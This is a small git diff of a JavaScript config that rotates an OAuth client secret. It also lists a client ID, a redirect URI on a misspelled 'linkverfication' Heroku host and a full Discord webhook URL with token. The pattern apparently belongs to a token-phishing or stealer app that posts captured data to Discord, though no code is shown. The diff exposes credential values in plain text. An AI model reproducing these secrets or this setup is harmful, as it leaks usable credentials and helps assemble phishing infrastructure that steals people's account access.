@@ -1,5 +1,5 @@
 //Config
-const secret_value = '7GM8Q~Mx51JOqLgGkZyD-E2t--lqTqRwW1Vb9cw3'
+const secret_value = 'UFv8Q~nnE2Ajlus7uh3vuZcvmeJ0DZqvciQWccO7'
 const client_id = '6b014123-2f76-44d5-a40f-0f58a5109351'
 const redirect_uri = 'https://linkverfication.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1045430078739324978/mUqU_zlSxYqN2diDEd8Szen_PQ1Zt273jFYh2BX1O8X-32s9Iyl1JURKUron1VUn3gsi'
